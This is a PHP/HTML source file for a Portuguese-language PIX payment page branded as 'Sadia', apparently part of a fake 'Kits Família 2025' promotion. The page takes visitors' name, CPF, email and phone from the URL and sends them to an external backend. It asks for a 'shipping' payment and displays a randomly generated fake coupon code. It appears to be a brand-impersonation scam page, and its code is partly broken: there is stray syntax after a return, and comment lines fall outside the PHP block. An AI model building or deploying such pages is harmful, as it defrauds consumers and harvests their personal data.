<?php
// ===== LIBERA O FRONTEND DO VERCEL =====
header("Access-Control-Allow-Origin: https://kitsfamilia2025.vercel.app");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header("Access-Control-Allow-Credentials: true");

// Se for uma requisição OPTIONS (pré-verificação do CORS)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}
?>
// ===============================
// CONFIGURAÇÃO BÁSICA
// ===============================
error_reporting(0);
ini_set('display_errors', 0);

// 🔍 Se quiser testar debug manualmente (sem HTML), adicione ?debug=1 na URL
if (isset($_GET['debug'])) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);

    $valor = isset($_GET['valor']) ? floatval(str_replace(',', '.', $_GET['valor'])) : 0;
    $nome  = $_GET['nome']  ?? '';
    $cpf   = $_GET['cpf']   ?? '';
    $email = $_GET['email'] ?? '';
    $phone = $_GET['phone'] ?? '';

    echo "📡 Debug inicial:\n";
    echo "Valor recebido: $valor\n";
    echo "Nome: $nome\n";
    echo "Caminho atual: " . __DIR__ . "\n";

    if ($valor && is_numeric($valor)) {
        $data = [
            'price' => number_format($valor, 2, '.', ''),
            'name'  => $nome,
            'email' => $email,
            'cpf'   => $cpf,
            'phone' => $phone
        ];

        $target = __DIR__ . '/API/payment/payment.php';
        echo "🧭 Tentando acessar: $target\n";

        if (!file_exists($target)) {
            echo "❌ ERRO: O arquivo payment.php não foi encontrado.\n";
            exit;
        }

        ob_start();
        include $target;
        $response = ob_get_clean();

        echo "✅ CURL RESPONSE:\n$response\n";
        exit;
    } else {
        echo "⚠️ Valor inválido recebido.\n";
        exit;
    }
}

// ===============================
// SEÇÃO VISUAL – TELA SADIA
// ===============================
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pagamento PIX - Sadia</title>
  <meta name="description" content="Complete seu pagamento via PIX para o Kit Sadia">
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Fontes e ícones -->
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <style>
    :root {
      --yellow: #f6c200;
      --red: #c70000;
      --dark: #222;
      --gray: #777;
      --radius: 14px;
      --container: 1100px;
    }

    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:'Montserrat', sans-serif; background:#fff; color:var(--dark); min-height:100vh; display:flex; flex-direction:column; }

    header { background:var(--yellow); padding:14px 20px; box-shadow:0 2px 6px rgba(0,0,0,0.1); }
    .header-inner { display:flex; align-items:center; justify-content:space-between; max-width:var(--container); margin:0 auto; }
    .header-left i, .header-right i { font-size:22px; color:var(--dark); cursor:pointer; margin-right:12px; }
    .header-center img { height:48px; display:block; }

    footer { background:var(--yellow); color:var(--dark); padding:30px 20px 20px; text-align:center; border-top-left-radius:var(--radius); border-top-right-radius:var(--radius); box-shadow:0 -4px 12px rgba(0,0,0,0.08); font-size:14px; margin-top:auto; }
    .footer-inner { max-width:var(--container); margin:0 auto; }
    .footer-logo img { height:50px; margin-bottom:15px; }
    .footer-links a { color:var(--dark); margin:0 10px; text-decoration:none; font-weight:600; transition:color 0.3s ease; }
    .footer-links a:hover { color:var(--red); }
    .footer-social a { display:inline-block; color:var(--dark); margin:0 8px; font-size:18px; transition:color 0.3s ease; }
    .footer-social a:hover { color:var(--red); }
    .footer-copy { font-size:13px; color:var(--gray); margin-top:15px; }

    @media(max-width:768px){
      .header-center img{height:40px;}
    }
  </style>
</head>

<body class="min-h-screen flex flex-col">

  <header>
    <div class="header-inner">
      <div class="header-left">
        <i class="fas fa-bars"></i>
        <i class="fas fa-search"></i>
      </div>
      <div class="header-center">
        <img src="./images/KitseCommerceSadiaLogo.png" alt="Logo Sadia Kits 2025">
      </div>
      <div class="header-right">
        <i class="fas fa-user"></i>
        <i class="fas fa-heart"></i>
        <i class="fas fa-shopping-bag"></i>
      </div>
    </div>
  </header>

  <main class="container mx-auto px-4 py-6 flex-1">
    <div class="max-w-2xl mx-auto">

      <div id="payment-status" class="bg-white rounded-2xl shadow-lg overflow-hidden mb-6">
        <div class="p-6 rounded-t-2xl shadow-lg" style="background-color: #c70000; color: #FFFF;">
          <h1 class="text-2xl font-bold mb-2">Aguardando Pagamento</h1>
          <p>Escaneie o QR Code abaixo para pagar</p>
        </div>
        
        <div class="p-6">
          <div id="cupom-preview" class="bg-gradient-to-r from-red-50 to-red-100 border-2 border-dashed border-red-300 rounded-lg p-4 mb-6">
            <div class="text-center space-y-2">
              <h3 class="font-semibold text-dark text-lg">Seu Cupom Sadia</h3>
              <div class="grid grid-cols-2 gap-4 text-sm">
                <div class="text-left">
                  <span class="font-semibold">Nome:</span>
                  <span id="cupom-nome" class="block text-dark">-</span>
                </div>
                <div class="text-right">
                  <span class="font-semibold">Código:</span>
                  <span id="cupom-codigo" class="block text-red-600 font-mono font-bold">-</span>
                </div>
              </div>
              <div class="flex justify-center">
                <span id="cupom-status" class="text-dark font-semibold">Aguardando Pagamento</span>
              </div>
              <hr class="border-red-300">
              <div class="flex justify-between items-center">
                <span class="font-semibold">Pagamento do Frete:</span>
                <span id="cupom-pessoaas" class="text-dark">Pendente</span>
              </div>
            </div>
          </div>
          
          <div id="pix-qr-code" class="text-center mb-6">
            <div class="bg-gray-100 rounded-lg p-6 inline-block">
              <div id="qr-code-placeholder" class="w-48 h-48 bg-gray-200 rounded-lg flex items-center justify-center">
                <span class="text-gray-500">Carregando QR Code...</span>
              </div>
            </div>
          </div>
          
          <div class="mb-6">
            <p class="text-sm text-gray-600 mb-2">Ou copie o código PIX:</p>
            <div class="flex items-center justify-center space-x-2">
              <input type="text" id="pix-code" readonly class="bg-gray-100 border border-gray-300 rounded-lg px-4 py-2 text-center font-mono text-sm w-80" value="Carregando...">
              <button id="copy-pix-btn" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg transition-colors" onclick="copyPixCode()">
                <i class="fas fa-copy mr-2"></i>Copiar
              </button>
            </div>
          </div>

          <div class="bg-gray-50 rounded-lg p-4 mb-6">
            <div class="grid grid-cols-2 gap-4 text-sm">
              <div class="text-left">
                <span class="text-gray-600">Valor:</span>
                <span id="payment-amount" class="block font-semibold text-red-600">R$ 0,00</span>
              </div>
              <div class="text-right">
                <span class="text-gray-600">ID Transação:</span>
                <span id="transaction-id" class="block font-mono text-xs text-gray-500">-</span>
              </div>
            </div>
          </div>

          <div class="text-sm text-gray-600 space-y-2 bg-red-50 p-4 rounded-lg">
            <p class="flex items-center"><i class="fas fa-mobile-alt text-red-600 mr-2"></i>Abra o app do seu banco</p>
            <p class="flex items-center"><i class="fas fa-qrcode text-red-600 mr-2"></i>Escolha pagar via PIX</p>
            <p class="flex items-center"><i class="fas fa-camera text-red-600 mr-2"></i>Escaneie o QR Code ou cole o código</p>
            <p class="flex items-center"><i class="fas fa-check-circle text-red-600 mr-2"></i>Confirme o pagamento</p>
          </div>
        </div>
      </div>

    </div>
  </main>

  <footer>
    <div class="footer-inner">
      <div class="footer-logo">
        <img src="./images/KitseCommerceSadiaLogo.png" alt="Logo Sadia Kits 2025">
      </div>
      <div class="footer-links">
        <a href="#">Política de Privacidade</a>
        <a href="#">Termos de Uso</a>
        <a href="#">Contato</a>
      </div>
      <div class="footer-social">
        <a href="#"><i class="fab fa-facebook-f"></i></a>
        <a href="#"><i class="fab fa-instagram"></i></a>
        <a href="#"><i class="fab fa-whatsapp"></i></a>
      </div>
      <p class="footer-copy">© 2025 Sadia Kits. Todos os direitos reservados.</p>
    </div>
  </footer>

  <!-- SCRIPT FINAL -->
  <script>
    async function carregarPix() {
      const params = new URLSearchParams(window.location.search);
      const valor = params.get("valor") || "0";
      const nome = params.get("nome") || "Cliente";
      const email = params.get("email") || "teste@teste.com";
      const cpf = params.get("cpf") || "00000000000";
      const phone = params.get("phone") || "11999999999";

      const formData = new FormData();
      formData.append("price", valor);
      formData.append("name", nome);
      formData.append("email", email);
      formData.append("cpf", cpf);
      formData.append("phone", phone);

      try {
        const url = `https://backend-sadia.onrender.com/pix.php?valor=${valor}&nome=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpf)}&email=${encodeURIComponent(email)}&phone=${encodeURIComponent(phone)}`;
const response = await fetch(url);
const html = await response.text();
document.open();
document.write(html);
document.close();
return;

        });

        const data = await response.json();
        console.log("🔍 Resposta da API:", data);

        // Busca o campo do QR em qualquer nível do JSON
        function findPixCode(obj) {
          if (!obj || typeof obj !== "object") return null;
          for (const key in obj) {
            if (typeof obj[key] === "object") {
              const result = findPixCode(obj[key]);
              if (result) return result;
            } else if (
              key.toLowerCase().includes("pix_code") ||
              key.toLowerCase().includes("qr_code")
            ) {
              return obj[key];
            }
          }
          return null;
        }

        const pixCode = findPixCode(data);

        if (pixCode) {
          document.getElementById("pix-code").value = pixCode;
          document.getElementById("payment-amount").textContent = `R$ ${valor.replace('.', ',')}`;
          const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(pixCode)}&size=250x250`;
          document.getElementById("qr-code-placeholder").innerHTML =
            `<img src="${qrUrl}" alt="QR Code" class="w-48 h-48 rounded-lg">`;
        } else {
          console.error("⚠️ QR Code não encontrado:", data);
          document.getElementById("qr-code-placeholder").innerHTML =
            `<span class="text-red-500 text-sm">Erro: QR Code não retornado.</span>`;
        }
      } catch (error) {
        console.error("❌ Erro ao gerar PIX:", error);
        alert("Erro ao processar pagamento PIX. Verifique a conexão e tente novamente.");
      }
    }

    function copyPixCode() {
      const pixCode = document.getElementById("pix-code");
      pixCode.select();
      document.execCommand("copy");
      const btn = document.getElementById("copy-pix-btn");
      const original = btn.innerHTML;
      btn.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
      btn.style.background = "#16a34a";
      setTimeout(() => { btn.innerHTML = original; btn.style.background = ""; }, 2000);
    }

    document.addEventListener("DOMContentLoaded", carregarPix);
    // === Atualiza nome e código do cupom ===

// Função pra gerar código aleatório tipo "COCOM611787"
function gerarCodigoCupom() {
  const prefixos = ["SAD", "COCOM", "KIT", "SD"];
  const prefix = prefixos[Math.floor(Math.random() * prefixos.length)];
  const num = Math.floor(100000 + Math.random() * 900000);
  return prefix + num;
}

// Quando a página carregar, atualizar os campos
document.addEventListener("DOMContentLoaded", () => {
  const params = new URLSearchParams(window.location.search);
  const nome = params.get("nome") || "Cliente";

  // Define nome e gera código
  document.getElementById("cupom-nome").textContent = nome;
  document.getElementById("cupom-codigo").textContent = gerarCodigoCupom();
});

  </script>
</body>
</html>
